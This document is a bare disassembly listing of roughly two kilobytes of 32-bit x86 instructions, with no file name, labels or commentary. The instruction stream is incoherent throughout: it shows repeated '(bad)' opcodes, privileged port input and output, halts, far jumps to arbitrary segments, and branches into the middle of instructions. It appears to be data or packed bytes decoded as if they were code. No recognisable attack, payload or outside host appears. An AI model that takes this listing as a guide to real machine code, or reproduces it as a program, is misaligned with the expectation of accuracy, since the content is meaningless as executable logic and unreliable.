  41667b:	xchg   esp,eax
  41667c:	retf   0x3129
  41667f:	pop    edi
  416680:	fisttp WORD PTR [eax]
  416682:	mov    ecx,fs
  416684:	in     eax,0x20
  416686:	fdiv   DWORD PTR [ecx+0x7e390cc4]
  41668c:	jns    0x41666d
  41668e:	mov    bl,0xf1
  416690:	rcl    BYTE PTR [edx+ecx*8],cl
  416693:	lock add eax,0xf3935949
  416699:	sbb    eax,0x378fa91a
  41669e:	aas    
  41669f:	(bad)  
  4166a0:	jge    0x41662a
  4166a2:	(bad)  ds:[esp+edi*4]
  4166a6:	stos   DWORD PTR es:[edi],eax
  4166a7:	out    dx,al
  4166a8:	fcomp  QWORD PTR [eax+0x5c]
  4166ab:	xor    eax,0x6eba268a
  4166b1:	popf   
  4166b2:	ret    
  4166b3:	fidivr WORD PTR [edx-0x2620db7e]
  4166b9:	enter  0x56e7,0xc1
  4166bd:	pop    ecx
  4166be:	mov    esp,0xfbbeb503
  4166c3:	fist   WORD PTR [edx+0x55]
  4166c6:	ja     0x4166db
  4166c8:	nop
  4166c9:	ror    DWORD PTR [ecx-0x6d7ae281],0xf
  4166d0:	push   ebp
  4166d1:	lods   al,BYTE PTR fs:[esi]
  4166d3:	push   ebx
  4166d4:	pusha  
  4166d5:	push   edx
  4166d6:	push   ebp
  4166d7:	or     al,0xec
  4166d9:	jmp    0x5db4:0x5a98489b
  4166e0:	mov    gs:0x40f2c0e5,al
  4166e6:	mov    eax,0xb9494c6a
  4166eb:	imul   esi,DWORD PTR [edx+0x46],0x1
  4166ef:	out    dx,eax
  4166f0:	dec    ebp
  4166f1:	mov    edx,0xfcc7b8f8
  4166f6:	jg     0x4166c7
  4166f8:	xchg   ecx,eax
  4166f9:	dec    edx
  4166fa:	into   
  4166fb:	push   0xba668ee6
  416700:	mov    ah,0x13
  416702:	inc    BYTE PTR [ebx+0x6]
  416705:	jbe    0x416747
  416707:	jbe    0x4166a4
  416709:	aas    
  41670a:	ins    BYTE PTR es:[edi],dx
  41670b:	lods   al,BYTE PTR es:[esi]
  41670d:	dec    edi
  41670e:	inc    ecx
  41670f:	popf   
  416710:	aad    0x39
  416712:	sbb    BYTE PTR [esi+ebx*4+0x500096b7],bh
  416719:	cmp    esp,DWORD PTR [edx]
  41671b:	jg     0x416799
  41671d:	idiv   DWORD PTR ds:0x410025bb
  416723:	sti    
  416724:	pop    esp
  416725:	in     eax,dx
  416726:	adc    edi,edi
  416728:	push   ds
  416729:	xor    edi,DWORD PTR [ebx-0x7f66d71f]
  41672f:	in     al,dx
  416730:	js     0x41679b
  416732:	xor    al,0xf0
  416734:	pop    ecx
  416735:	(bad)  
  416736:	int3   
  416737:	or     eax,0xa089020d
  41673c:	sti    
  41673d:	loope  0x416764
  41673f:	pop    ecx
  416740:	in     al,dx
  416741:	je     0x416749
  416743:	xchg   edx,eax
  416744:	jmp    0x416723
  416746:	or     ch,BYTE PTR [ebp-0x5c8cb453]
  41674c:	idiv   DWORD PTR [edx]
  41674e:	mov    bh,0xb0
  416750:	pop    esi
  416751:	aad    0xad
  416753:	js     0x416788
  416755:	fidiv  WORD PTR [ecx]
  416757:	sbb    esp,eax
  416759:	test   edx,0xd899d31c
  41675f:	dec    esp
  416760:	or     esp,DWORD PTR [ebx+eiz*1+0x13]
  416764:	mov    bl,BYTE PTR [esi+0x2f]
  416767:	or     DWORD PTR [esi],eax
  416769:	push   edi
  41676a:	mov    esi,0x269f351f
  41676f:	repz retf 0x1ae7
  416773:	and    al,0x88
  416775:	xchg   ecx,eax
  416776:	and    esp,DWORD PTR [ebx+0x7b26a269]
  41677c:	bound  esi,QWORD PTR [eax-0x79]
  41677f:	or     DWORD PTR [edi],edx
  416781:	clc    
  416782:	std    
  416783:	retf   
  416784:	outs   dx,BYTE PTR ds:[esi]
  416785:	add    al,0xa3
  416787:	or     al,0xdd
  416789:	xchg   ebp,eax
  41678a:	xchg   ecx,eax
  41678b:	popf   
  41678c:	in     al,0x62
  41678e:	inc    esp
  41678f:	sub    ebp,DWORD PTR [ecx+0x7c4cd275]
  416795:	ins    DWORD PTR es:[edi],dx
  416796:	(bad)  
  416798:	cli    
  416799:	popf   
  41679a:	lock fnsave [esi+0x2a]
  41679e:	mov    esp,0x352beeb6
  4167a3:	xor    DWORD PTR [ebx],edx
  4167a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167a6:	pop    esi
  4167a7:	mov    ebp,0x20de6b69
  4167ac:	into   
  4167ad:	push   eax
  4167ae:	sti    
  4167af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167b0:	jg     0x41679a
  4167b2:	int    0x76
  4167b4:	sub    al,0xcc
  4167b6:	pop    edi
  4167b7:	cld    
  4167b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167b9:	inc    edx
  4167ba:	add    DWORD PTR [eax+0x508a3c90],0x73
  4167c1:	es dec esp
  4167c3:	adc    dl,BYTE PTR [ebp+0xc]
  4167c6:	add    DWORD PTR [edx+0x34],edx
  4167c9:	shr    cl,1
  4167cb:	lds    edi,FWORD PTR [ebx+0xe]
  4167ce:	mov    bl,0x9
  4167d0:	ds in  al,dx
  4167d2:	loopne 0x416831
  4167d4:	dec    ebp
  4167d5:	(bad)  
  4167d6:	das    
  4167d7:	push   esi
  4167d8:	sub    edx,DWORD PTR [edx]
  4167da:	xchg   esi,eax
  4167db:	push   0x1e
  4167dd:	adc    BYTE PTR [ebx],cl
  4167df:	xchg   ecx,eax
  4167e0:	into   
  4167e1:	pusha  
  4167e2:	xchg   DWORD PTR [edx-0x793a0594],edx
  4167e8:	test   al,0x27
  4167ea:	lock or BYTE PTR [eax+esi*2-0x5d],ch
  4167ef:	test   al,0x36
  4167f1:	lock in eax,0x2c
  4167f4:	pop    edx
  4167f5:	iret   
  4167f6:	xchg   DWORD PTR [edi-0x40f23eae],ebx
  4167fc:	push   ebx
  4167fd:	(bad)  
  4167fe:	jbe    0x416796
  416800:	adc    al,0xe9
  416802:	add    eax,0xde812b02
  416807:	add    al,0x98
  416809:	mov    BYTE PTR [esi+0x2dc4f1ba],dl
  41680f:	arpl   WORD PTR ds:0xe1a54180,ax
  416815:	dec    ebp
  416816:	jge    0x416870
  416818:	retf   0xa661
  41681b:	inc    ecx
  41681c:	jb     0x4167e0
  41681e:	test   al,0x2e
  416820:	or     cl,dl
  416822:	retf   0x17cb
  416825:	jle    0x41683a
  416827:	out    0xac,eax
  416829:	ins    BYTE PTR es:[edi],dx
  41682a:	sub    BYTE PTR [ebx+0x6821d109],dl
  416830:	pushf  
  416831:	loop   0x4167e8
  416833:	or     BYTE PTR [esi-0x14],bl
  416836:	call   0xdc61e183
  41683b:	pop    ds
  41683c:	and    al,BYTE PTR [edi]
  41683e:	sbb    ch,al
  416840:	push   ss
  416841:	lods   al,BYTE PTR ds:[esi]
  416842:	loope  0x4167f6
  416844:	dec    edi
  416845:	push   edx
  416846:	aaa    
  416847:	jge    0x416849
  416849:	mov    dl,0xbc
  41684b:	(bad)  
  41684d:	add    al,0xcb
  41684f:	add    DWORD PTR [ebp-0x10],ebx
  416852:	add    ebx,DWORD PTR [ecx]
  416854:	loop   0x416843
  416856:	jb     0x4167f5
  416858:	or     bl,ch
  41685a:	pop    ss
  41685b:	iret   
  41685c:	popf   
  41685d:	adc    dh,BYTE PTR [esp+ebx*2]
  416860:	jne    0x41683a
  416862:	stos   DWORD PTR es:[edi],eax
  416863:	inc    ebp
  416864:	pop    ebx
  416865:	in     eax,0xd3
  416867:	xor    eax,0x5b03f538
  41686c:	or     BYTE PTR [ebx+0x60d64acb],0x75
  416873:	or     dl,ah
  416875:	aam    0x68
  416877:	adc    DWORD PTR [ecx],esp
  416879:	iret   
  41687a:	and    eax,0x9cbaa881
  41687f:	mov    ?,WORD PTR [ebx]
  416881:	adc    dh,BYTE PTR [edi]
  416883:	mov    cl,0x4b
  416885:	jl     0x416899
  416887:	or     eax,0x75596500
  41688c:	retf   
  41688d:	inc    esp
  41688e:	xor    al,0x68
  416890:	cli    
  416891:	add    eax,0x70add850
  416896:	out    dx,al
  416897:	push   0x4f9cedac
  41689c:	sahf   
  41689d:	call   0x1a82:0x7403bcb6
  4168a4:	and    ah,bl
  4168a6:	fimul  DWORD PTR [ecx-0xa]
  4168a9:	xor    DWORD PTR [eax+0x36eb8774],eax
  4168af:	or     eax,0x34febd91
  4168b4:	jne    0x416862
  4168b6:	hlt    
  4168b7:	test   BYTE PTR [eax-0x3056d0d8],cl
  4168bd:	ret    
  4168be:	mov    ebx,0xd3574cf4
  4168c3:	(bad)  
  4168c4:	fdivr  QWORD PTR [esp+ecx*1-0x1d]
  4168c8:	test   ebp,ecx
  4168ca:	xchg   edx,eax
  4168cb:	nop
  4168cc:	pushf  
  4168cd:	pop    ds
  4168ce:	mov    bh,0x59
  4168d0:	inc    esi
  4168d2:	stos   BYTE PTR es:[edi],al
  4168d3:	ins    BYTE PTR es:[edi],dx
  4168d4:	sub    dl,BYTE PTR [edx-0x467500fd]
  4168da:	fs dec ebp
  4168dc:	sbb    dh,dl
  4168de:	cmp    eax,0x15a3e67b
  4168e3:	fistp  DWORD PTR [eax+0x66]
  4168e6:	ret    
  4168e7:	(bad)  
  4168e8:	cmp    eax,0x1600712c
  4168ed:	and    al,0x3e
  4168ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168f0:	mov    edx,0x57f10501
  4168f5:	jmp    FWORD PTR [esi+0x2105f7cc]
  4168fb:	fistp  WORD PTR [esi+0x45]
  4168fe:	push   ebx
  4168ff:	out    0x89,al
  416901:	into   
  416902:	leave  
  416903:	mov    bl,0x36
  416905:	cli    
  416906:	jmp    0x687:0xe71c221d
  41690d:	add    DWORD PTR [ebp+0x2e7d58e],0xffffffe2
  416914:	sub    al,0x17
  416916:	fwait
  416917:	or     ah,BYTE PTR [eax+0x75587c38]
  41691d:	mov    ebx,0x250084be
  416922:	cmp    al,0xd
  416924:	xor    dh,BYTE PTR [ebp-0xf]
  416927:	xchg   ecx,eax
  416928:	xor    bh,BYTE PTR [edx-0x21]
  41692b:	call   0x78ed4fba
  416930:	mov    ebp,0x802c621d
  416935:	mov    eax,ds:0x605797dd
  41693a:	inc    edi
  41693b:	mov    eax,ds:0x655a24cc
  416940:	add    eax,0x149fffa4
  416945:	mov    esi,DWORD PTR ds:[ecx]
  416948:	imul   ebx,DWORD PTR [edx+0x3],0xffffff95
  41694c:	mov    dl,0x68
  41694e:	xchg   esi,eax
  41694f:	into   
  416950:	or     eax,0x310e1f03
  416955:	outs   dx,BYTE PTR ds:[esi]
  416956:	enter  0x8feb,0xc4
  41695a:	fs gs je 0x4169c1
  41695e:	in     eax,dx
  41695f:	and    ch,ah
  416961:	lods   eax,DWORD PTR ds:[esi]
  416962:	mov    al,ds:0x50c9d978
  416967:	pop    ebp
  416968:	pop    ss
  416969:	das    
  41696a:	push   ss
  41696b:	cwde   
  41696c:	cmp    al,0x3c
  41696e:	repnz fcom QWORD PTR [ecx]
  416971:	dec    ebx
  416972:	sub    dl,BYTE PTR [eax]
  416974:	mov    cl,0x20
  416976:	out    dx,eax
  416977:	repnz push 0x9a6e06f2
  41697d:	sbb    al,0xe9
  41697f:	clc    
  416980:	sub    al,0xee
  416982:	sub    BYTE PTR [edx-0x32efd4cb],ch
  416988:	jmp    0x416924
  41698a:	int3   
  41698b:	fild   QWORD PTR [edx+0x65372499]
  416991:	sbb    bl,BYTE PTR [eax+0x4c64355]
  416997:	neg    DWORD PTR [eax+0x4205866b]
  41699d:	aas    
  41699e:	cld    
  41699f:	shl    BYTE PTR [ecx-0x19],1
  4169a2:	int3   
  4169a3:	push   ebp
  4169a4:	jl     0x4169ec
  4169a6:	mov    ecx,0x81be981d
  4169ab:	mov    bh,0x74
  4169ad:	lahf   
  4169ae:	xor    eax,0xf9411484
  4169b3:	dec    ecx
  4169b4:	or     bh,BYTE PTR [ebx-0x5f]
  4169b7:	call   0xb44c4ac8
  4169bc:	adc    esp,eax
  4169be:	fwait
  4169bf:	shr    DWORD PTR [eax+eax*2+0x7a],0x72
  4169c4:	scas   eax,DWORD PTR es:[edi]
  4169c5:	add    edi,DWORD PTR gs:[eax-0x7cef7071]
  4169cc:	cwde   
  4169cd:	arpl   WORD PTR [edx+0x68],ax
  4169d0:	push   edi
  4169d1:	jo     0x416a24
  4169d3:	push   cs
  4169d4:	adc    DWORD PTR [ecx+0x673dc62d],esp
  4169da:	mov    al,ds:0x6fb238ab
  4169df:	pop    ds
  4169e0:	inc    esi
  4169e1:	out    0xbb,eax
  4169e3:	and    cl,bl
  4169e5:	pop    ss
  4169e6:	js     0x416a20
  4169e8:	jno    0x416a32
  4169ea:	or     DWORD PTR ds:0xc43b2f8a,esi
  4169f0:	sbb    ecx,DWORD PTR [eax-0x4f]
  4169f3:	mov    ecx,0xd1df6686
  4169f8:	sbb    DWORD PTR [ebx-0x1a],edx
  4169fb:	mov    esi,0x82938061
  416a00:	inc    ebp
  416a01:	les    ebp,FWORD PTR [ebx-0x4e]
  416a04:	push   0x12645e75
  416a09:	push   ecx
  416a0a:	dec    ebx
  416a0b:	inc    esp
  416a0c:	adc    eax,0x1b973118
  416a11:	int3   
  416a12:	sbb    ah,BYTE PTR [ecx]
  416a14:	add    al,bl
  416a16:	jmp    0x416a63
  416a18:	mov    edi,0xd2f994f3
  416a1d:	in     eax,0x96
  416a1f:	cmp    esi,ebp
  416a21:	(bad)  
  416a22:	lds    ebx,FWORD PTR [ebx-0x55]
  416a25:	fistp  QWORD PTR [ebx+0x61e07716]
  416a2b:	mov    BYTE PTR [edx+0x754478b7],al
  416a31:	int    0xc7
  416a33:	push   0x95dc9cd9
  416a38:	jmp    0xe065:0xa11ba832
  416a3f:	call   0xa997:0xfedefe15
  416a46:	xchg   ebp,eax
  416a47:	push   edi
  416a48:	ficom  WORD PTR [eax+eax*1+0x374bdbda]
  416a4f:	mov    bl,0x59
  416a51:	push   bx
  416a53:	jl     0x416a6d
  416a55:	shl    DWORD PTR [esi+0x43620dfc],cl
  416a5b:	(bad)  
  416a5c:	call   0x8b96:0xd16452cf
  416a63:	sub    DWORD PTR [ebp+0x2879c100],esi
  416a69:	adc    BYTE PTR [eax+0x3f0c2566],bh
  416a6f:	aad    0xf2
  416a71:	or     DWORD PTR ss:[edx+0x3f],edi
  416a75:	(bad)  
  416a76:	sbb    edi,DWORD PTR [eax+0x75]
  416a79:	xchg   BYTE PTR [ebx+0x3d],ch
  416a7c:	mov    esp,0xdd28d05e
  416a81:	dec    edx
  416a82:	inc    edi
  416a83:	cdq    
  416a84:	push   edi
  416a85:	jecxz  0x416a62
  416a87:	cmp    eax,0x8898a9fe
  416a8c:	xor    ebp,DWORD PTR [edx]
  416a8e:	inc    ebp
  416a8f:	push   0xcd590008
  416a94:	ja     0x416aa3
  416a96:	leave  
  416a97:	push   0x12fe812e
  416a9c:	ins    BYTE PTR es:[edi],dx
  416a9d:	jge    0x416b15
  416a9f:	fsub   st,st(5)
  416aa1:	ja     0x416a23
  416aa3:	int    0x1a
  416aa5:	out    0xb8,al
  416aa7:	sub    BYTE PTR [ebx+eiz*8],0xc5
  416aab:	adc    esp,DWORD PTR [edi+0x4797a162]
  416ab1:	fistp  WORD PTR [ebx+0x5e7e8243]
  416ab7:	call   0xf674:0xec406bac
  416abe:	dec    ecx
  416abf:	push   esi
  416ac0:	mov    ?,WORD PTR [esp+edi*2+0x62346dfd]
  416ac7:	dec    esp
  416ac8:	mov    esi,0x7a1c66b5
  416acd:	push   esi
  416ace:	mov    dl,0x21
  416ad0:	pop    ss
  416ad1:	mov    al,0x61
  416ad3:	fs and dh,0x12
  416ad7:	mov    ch,0xd0
  416ad9:	add    DWORD PTR [ecx],edi
  416adb:	sub    BYTE PTR [edi-0x7bbcafef],dl
  416ae1:	rcr    BYTE PTR [esi+0x14],cl
  416ae4:	dec    esp
  416ae5:	mov    cl,0x6c
  416ae7:	xchg   DWORD PTR ds:0x462c15be,esi
  416aed:	pop    esp
  416aee:	mov    bl,0x67
  416af0:	sub    al,dl
  416af2:	jae    0x416aed
  416af4:	add    DWORD PTR [esi],esp
  416af6:	or     al,0x78
  416af8:	dec    edi
  416af9:	mov    esp,0x28713f1a
  416afe:	push   0xffffffa2
  416b00:	test   ebp,ebx
  416b02:	cmp    edi,DWORD PTR [edi]
  416b04:	and    al,0x2b
  416b06:	cmp    BYTE PTR [edx+0x3fd65f7b],ch
  416b0c:	and    al,0x52
  416b0e:	pop    edi
  416b0f:	das    
  416b10:	xchg   DWORD PTR [ebp+0x1ed46fc4],ecx
  416b16:	xchg   edi,eax
  416b17:	fisttp WORD PTR [edi+0x9]
  416b1a:	mov    bh,0x6
  416b1c:	fild   WORD PTR [ecx-0x4c]
  416b1f:	inc    ebp
  416b20:	mov    ss,WORD PTR [eax+0x58]
  416b23:	int3   
  416b24:	jecxz  0x416aae
  416b26:	jecxz  0x416af8
  416b28:	fisub  DWORD PTR [eax+0x5a]
  416b2b:	fbld   TBYTE PTR [esi-0x35]
  416b2e:	arpl   WORD PTR [ecx-0x9],di
  416b31:	pop    edx
  416b32:	mov    WORD PTR [edx*8-0x651cc7c],gs
  416b39:	and    bl,BYTE PTR [ebx]
  416b3b:	jne    0x416b42
  416b3d:	pop    ebx
  416b3e:	call   0xf8e6:0xd0ac57f9
  416b45:	out    0x18,al
  416b47:	(bad)  
  416b48:	jmp    0x416ae3
  416b4a:	popa   
  416b4b:	xchg   ebx,eax
  416b4c:	sbb    eax,0xa9b48813
  416b51:	nop
  416b52:	imul   ebp,esi,0x6c
  416b55:	dec    esi
  416b56:	and    BYTE PTR [ebx-0x63],ah
  416b59:	add    esi,DWORD PTR [edi]
  416b5b:	sar    BYTE PTR [edi+0x26],0x36
  416b5f:	and    BYTE PTR [ebp+0x1d],bl
  416b62:	mov    bh,0x6
  416b64:	pop    esi
  416b65:	aad    0x1b
  416b67:	popf   
  416b68:	inc    edx
  416b69:	push   ss
  416b6a:	lds    ecx,FWORD PTR [ecx+esi*4+0x45]
  416b6e:	pop    ecx
  416b6f:	inc    edx
  416b70:	xchg   edx,eax
  416b71:	iret   
  416b72:	out    dx,al
  416b73:	leave  
  416b74:	push   0x5f9fecce
  416b79:	cmp    edx,DWORD PTR [esi+edi*2-0x2b02515b]
  416b80:	scas   al,BYTE PTR es:[edi]
  416b81:	add    eax,0x31b6f282
  416b86:	adc    BYTE PTR [edi],dh
  416b88:	inc    esi
  416b89:	test   BYTE PTR ds:0x1776aa8e,0x5e
  416b90:	stos   BYTE PTR es:[edi],al
  416b91:	xor    ecx,ebp
  416b93:	(bad)  
  416b94:	sbb    BYTE PTR [ecx+0x3cc42088],bh
  416b9a:	ds xchg ecx,ebp
  416b9d:	push   ds
  416b9e:	mov    al,0x6b
  416ba0:	js     0x416bd0
  416ba2:	jbe    0x416b8a
  416ba4:	mov    DWORD PTR [esi+0x43],0xe5cd3b0c
  416bab:	dec    ebp
  416bac:	sti    
  416bad:	push   ss
  416bae:	xchg   ebx,eax
  416baf:	sub    ebp,DWORD PTR [ebx-0x67b6c353]
  416bb5:	inc    edi
  416bb6:	pop    eax
  416bb7:	mov    cl,0x76
  416bb9:	popw   ds
  416bbb:	imul   ebx,DWORD PTR [ebp+0xf8e1613],0xd
  416bc2:	mov    ds:0xf8ec2035,al
  416bc7:	dec    edx
  416bc8:	ja     0x416c08
  416bca:	and    DWORD PTR ss:[eax+0x41b6532a],edx
  416bd1:	sbb    eax,0x592739df
  416bd6:	outs   dx,DWORD PTR ds:[esi]
  416bd7:	sub    bl,0x1a
  416bda:	xlat   BYTE PTR ds:[ebx]
  416bdb:	xchg   edi,eax
  416bdc:	ins    DWORD PTR es:[edi],dx
  416bdd:	push   ss
  416bde:	mov    gs,WORD PTR [ecx-0x53a7e619]
  416be4:	inc    esi
  416be5:	ror    DWORD PTR ds:0x9ae3f98d,0x45
  416bec:	mov    DWORD PTR [eax-0x2f245dde],esp
  416bf2:	pop    ebp
  416bf3:	pop    esi
  416bf4:	out    0x18,eax
  416bf6:	xchg   ecx,eax
  416bf7:	push   0xc50e5d82
  416bfc:	aad    0x1d
  416bfe:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c00:	arpl   WORD PTR [edi+0x3ded1134],di
  416c06:	mov    bh,0x94
  416c08:	sbb    ebp,DWORD PTR [edi+0x21]
  416c0b:	mov    cl,0x34
  416c0d:	ss std 
  416c0f:	retf   
  416c10:	adc    ah,cl
  416c12:	loop   0x416c43
  416c14:	push   ss
  416c15:	das    
  416c16:	or     eax,ecx
  416c18:	test   al,0x4c
  416c1a:	int3   
  416c1b:	mov    al,ds:0xed3eea8a
  416c20:	scas   al,BYTE PTR es:[edi]
  416c21:	jl     0x416c97
  416c23:	push   es
  416c24:	push   DWORD PTR [ecx+0xa4292f2]
  416c2a:	dec    ecx
  416c2b:	cwde   
  416c2c:	cmp    bl,ah
  416c2e:	cmp    al,0xb5
  416c30:	xchg   ebx,eax
  416c31:	mov    eax,ds:0x33626788
  416c36:	outs   dx,DWORD PTR ds:[esi]
  416c37:	(bad)  
  416c38:	fwait
  416c39:	pop    esi
  416c3a:	cld    
  416c3b:	jmp    DWORD PTR [edi]
  416c3d:	scas   eax,DWORD PTR es:[edi]
  416c3e:	xchg   ecx,eax
  416c3f:	fs push ecx
  416c41:	mov    al,0x97
  416c43:	mov    dh,0xd8
  416c45:	or     al,BYTE PTR [ecx+edx*1]
  416c48:	cmc    
  416c49:	ins    DWORD PTR es:[edi],dx
  416c4a:	or     DWORD PTR [ecx],eax
  416c4c:	mov    edi,edi
  416c4e:	mov    ecx,0x16b80713
  416c53:	call   0x4d16d1ec
  416c58:	jo     0x416c64
  416c5a:	inc    edi
  416c5b:	int    0x3b
  416c5d:	in     al,0x7c
  416c5f:	xor    BYTE PTR [edx-0x1db9b862],dl
  416c65:	cmp    al,0xe6
  416c67:	addr16 (bad) 
  416c69:	mov    edi,eax
  416c6b:	sar    bl,1
  416c6d:	and    ebx,DWORD PTR [edi-0x38]
  416c70:	mov    eax,ds:0x902a92ec
  416c75:	cli    
  416c76:	shl    ah,cl
  416c78:	xchg   esi,eax
  416c79:	outs   dx,BYTE PTR ds:[esi]
  416c7a:	rcl    DWORD PTR [edi-0x17c697da],cl
  416c80:	cmp    edi,DWORD PTR [esi]
  416c82:	sub    DWORD PTR [edx+0x43af6cb9],esp
  416c88:	jecxz  0x416cff
  416c8a:	cld    
  416c8b:	and    DWORD PTR [edx],ecx
  416c8d:	push   eax
  416c8e:	(bad)  
  416c8f:	iret   
  416c90:	aad    0x68
  416c92:	add    BYTE PTR [eax-0x48aaf769],0xe0
  416c99:	sbb    ebp,eax
  416c9b:	pop    esp
  416c9c:	inc    ebp
  416c9d:	ja     0x416c30
  416c9f:	dec    edx
  416ca0:	fiadd  DWORD PTR [eax+0x17]
  416ca3:	fcom   DWORD PTR [ebx-0x38]
  416ca6:	mov    dl,0x30
  416ca8:	leave  
  416ca9:	jmp    0x1a3cfa6b
  416cae:	popa   
  416caf:	pop    ds
  416cb0:	xchg   bl,ch
  416cb2:	add    dl,BYTE PTR [esi]
  416cb4:	rcl    DWORD PTR [eax+0x263b8645],0x77
  416cbb:	ins    BYTE PTR es:[edi],dx
  416cbc:	gs jl  0x416d1d
  416cbf:	or     al,0x26
  416cc1:	xor    eax,DWORD PTR [edx+0x100d89ec]
  416cc7:	aas    
  416cc8:	data16 mov bh,0x40
  416ccb:	into   
  416ccc:	adc    eax,0x31263811
  416cd1:	inc    eax
  416cd2:	jnp    0x416c7f
  416cd4:	jle    0x416cb8
  416cd6:	out    0xf,al
  416cd8:	mov    esp,0xdc34caa3
  416cdd:	dec    esi
  416cde:	repnz and eax,0xb4c391cc
  416ce4:	mov    al,ds:0x4eaf4107
  416ce9:	pop    es
  416cea:	jle    0x416cdd
  416cec:	imul   esp,DWORD PTR [esi],0xfa7ecbb9
  416cf2:	js     0x416ca4
  416cf4:	pop    ss
  416cf5:	dec    ebx
  416cf6:	retfw  0x223d
  416cfa:	loope  0x416d20
  416cfc:	cmp    DWORD PTR [ebp+0x4e],0x76
  416d00:	leave  
  416d01:	ins    BYTE PTR es:[edi],dx
  416d02:	add    BYTE PTR [edx-0x756dcc27],0xf9
  416d09:	add    edi,DWORD PTR [edi+0x3b0dc502]
  416d0f:	sub    bl,bl
  416d11:	ja     0x416d89
  416d13:	ja     0x416d65
  416d15:	pop    ebx
  416d16:	ins    BYTE PTR es:[edi],dx
  416d17:	pop    ecx
  416d18:	mov    cl,0x3
  416d1a:	out    0x1f,eax
  416d1c:	das    
  416d1d:	stos   DWORD PTR es:[edi],eax
  416d1e:	ja     0x416cdb
  416d20:	inc    ecx
  416d21:	and    al,0xc9
  416d23:	push   0x18
  416d25:	les    ebp,FWORD PTR [ecx-0x253a10c2]
  416d2b:	les    ebp,FWORD PTR ds:0x94e5736b
  416d31:	mov    BYTE PTR [ebp+0x53],ch
  416d34:	dec    ecx
  416d35:	cmp    al,0xe7
  416d37:	lea    eax,[ebp-0x6e]
  416d3a:	push   cs
  416d3b:	int3   
  416d3c:	pop    ss
  416d3d:	shl    BYTE PTR [ebx+edx*1],cl
  416d40:	mov    edi,0x4d0ad2ad
  416d45:	icebp  
  416d46:	test   DWORD PTR [edi+ebx*1-0x20],ecx
  416d4a:	jle    0x416d4b
  416d4c:	fimul  WORD PTR [edx]
  416d4e:	enter  0x83a1,0x6
  416d52:	mov    eax,0xa45f2e93
  416d57:	push   esi
  416d58:	jae    0x416dc6
  416d5a:	push   edi
  416d5b:	pop    es
  416d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d5d:	call   0xc996:0x190bebec
  416d64:	push   edi
  416d65:	inc    esi
  416d66:	cmp    edx,DWORD PTR [ebp+eiz*8-0x51bd5e6f]
  416d6d:	cmp    ebx,edx
  416d6f:	in     eax,0xf5
  416d71:	or     al,0x34
  416d73:	jge    0x416cf9
  416d75:	cld    
  416d76:	pop    ebp
  416d77:	arpl   WORD PTR [esi+0x79],bp
  416d7a:	adc    al,0x3c
  416d7c:	or     DWORD PTR [ecx+0xa],ebp
  416d7f:	test   al,0x0
  416d81:	outs   dx,DWORD PTR ds:[esi]
  416d82:	and    ch,BYTE PTR [edx+0x41b28472]
  416d88:	inc    ebp
  416d89:	adc    BYTE PTR [edi+0x30],cl
  416d8c:	jbe    0x416d7b
  416d8e:	rcr    DWORD PTR [ecx+0x1bb0b144],cl
  416d94:	adc    ch,0x48
  416d97:	inc    ebx
  416d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d99:	icebp  
  416d9a:	push   edi
  416d9c:	leave  
  416d9d:	js     0x416dd3
  416d9f:	mul    ebx
  416da1:	jmp    DWORD PTR ds:0x1edc9f3a
  416da7:	jmp    0x416d3c
  416da9:	call   0xdf68:0x4b8513d3
  416db0:	rcr    DWORD PTR cs:[edx-0x25],cl
  416db4:	bound  ebx,QWORD PTR [ebp-0x28540b68]
  416dba:	mov    esp,0x7730d531
  416dbf:	pop    ebx
  416dc0:	xor    bh,dl
  416dc2:	dec    ecx
  416dc3:	adc    al,0x96
  416dc5:	inc    ecx
  416dc6:	test   al,0xa2
  416dc8:	inc    eax
  416dc9:	xor    cl,0x1f
  416dcc:	pop    ds
  416dcd:	cmp    DWORD PTR [esi-0x10],ecx
  416dd0:	lock sbb ch,BYTE PTR cs:[ecx+0x4f]
  416dd5:	or     al,0xae
  416dd7:	ins    DWORD PTR es:[edi],dx
  416dd8:	cmp    ch,BYTE PTR [ecx+ebp*8+0x4]
  416ddc:	test   DWORD PTR [ebp-0x648a089e],esp
  416de2:	iret   
  416de3:	inc    ecx
  416de4:	dec    ecx
  416de5:	rcl    DWORD PTR [edx-0x274140fd],1
  416deb:	sar    BYTE PTR [eax],1
  416ded:	cmc    
  416dee:	sub    al,0xe4
  416df0:	js     0x416dc1
  416df2:	jmp    0x352f24fe
  416df7:	cdq    
  416df8:	push   edx
  416df9:	inc    ecx
  416dfa:	mov    dh,0x6
  416dfc:	popf   
  416dfd:	fld    TBYTE PTR [edx+0x5cf8bf84]
  416e03:	inc    esi
  416e04:	hlt    
  416e05:	scas   eax,DWORD PTR es:[edi]
  416e06:	sbb    eax,0xf45e4c56
  416e0b:	push   ds
  416e0c:	js     0x416d9a
  416e0e:	xor    eax,0xe5c2093f
  416e13:	ss cmp eax,0x5e1b4511
  416e19:	pop    ebp
  416e1a:	cmp    DWORD PTR [edi*8+0x5c9694c8],ecx
  416e21:	shl    DWORD PTR [esi-0x18],cl
  416e24:	fild   QWORD PTR [eax]
  416e26:	add    bh,BYTE PTR [ecx]
  416e28:	jae    0x416dd9
  416e2a:	xchg   esp,eax
  416e2b:	cmp    esi,esi
  416e2d:	clc    
  416e2e:	or     eax,0x154d0549
  416e33:	aas    
  416e34:	jp     0x416dc0
  416e36:	ret    
  416e37:	and    al,al
  416e39:	jnp    0xfc7ea463
  416e3f:	sar    edi,1
  416e41:	mov    ebp,0xdf581081
  416e46:	inc    esi
  416e47:	mov    bl,0xed
  416e49:	ins    DWORD PTR es:[edi],dx
  416e4a:	jbe    0x416e1b
  416e4c:	fbld   TBYTE PTR [eax+0x44]
  416e4f:	mov    ds,WORD PTR [ebp-0x4b]
  416e52:	mov    DWORD PTR [ebp+0x4501bc4b],esp
  416e58:	or     eax,esp
  416e5a:	pop    ebp
  416e5b:	das    
  416e5c:	and    dl,BYTE PTR [esi]
  416e5e:	lods   al,BYTE PTR ds:[esi]
  416e5f:	das    
  416e60:	and    BYTE PTR [ebp+ebp*4-0x18],dl
  416e64:	fidiv  WORD PTR [edx+0x18]
  416e67:	(bad)  
  416e68:	jb     0x416e9d
